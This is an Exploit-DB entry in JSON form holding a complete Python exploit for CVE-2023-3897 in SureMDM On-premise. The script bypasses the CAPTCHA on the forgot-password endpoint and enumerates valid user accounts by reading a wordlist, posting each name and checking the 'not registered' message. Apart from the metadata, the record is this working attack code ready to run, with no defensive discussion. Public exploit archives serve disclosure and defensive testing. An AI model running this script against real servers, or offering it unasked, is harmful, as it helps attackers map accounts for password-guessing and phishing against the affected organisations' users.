{"source": "https://www.exploit-db.com/exploits/51804", "vulnName": "SureMDM On-premise < 6.31 - CAPTCHA Bypass User Enumeration", "vulnEDBID": "51804", "vulnCVE": "2023-3897", "author": "JONAS BENJAMIN FRIEDLI", "exploitType": "WEBAPPS", "platform": "MULTIPLE", "datePublished": "2024-02-19", "vulnContent": "# Exploit Title: SureMDM On-premise < 6.31 - CAPTCHA Bypass User Enumeration\n# Date: 05/12/2023\n# Exploit Author: Jonas Benjamin Friedli\n# Vendor Homepage: https://www.42gears.com/products/mobile-device-management/\n# Version: <= 6.31\n# Tested on: 6.31\n# CVE : CVE-2023-3897\n\nimport requests\nimport sys\n\ndef print_help():\n    print(\"Usage: python script.py [URL] [UserListFile]\")\n    sys.exit(1)\n\n\ndef main():\n    if len(sys.argv) != 3 or sys.argv[1] == '-h':\n        print_help()\n\n    url, user_list_file = sys.argv[1], sys.argv[2]\n\n    try:\n        with open(user_list_file, 'r') as file:\n            users = file.read().splitlines()\n    except FileNotFoundError:\n        print(f\"User list file '{user_list_file}' not found.\")\n        sys.exit(1)\n\n    valid_users = []\n    bypass_dir = \"/ForgotPassword.aspx/ForgetPasswordRequest\"\n    enumerate_txt = \"This User ID/Email ID is not registered.\"\n    for index, user in enumerate(users):\n        progress = (index + 1) / len(users) * 100\n        print(f\"Processing {index + 1}/{len(users)} users ({progress:.2f}%)\", end=\"\\r\")\n\n        data = {\"UserId\": user}\n        response = requests.post(\n            f\"{url}{bypass_dir}\",\n            json=data,\n            headers={\"Content-Type\": \"application/json; charset=utf-8\"}\n        )\n\n        if response.status_code == 200:\n            response_data = response.json()\n            if enumerate_txt not in response_data.get('d', {}).get('message', ''):\n                valid_users.append(user)\n\n    print(\"\\nFinished processing users.\")\n    print(f\"Valid Users Found: {len(valid_users)}\")\n    for user in valid_users:\n        print(user)\n\nif __name__ == \"__main__\":\n    main()\n            "}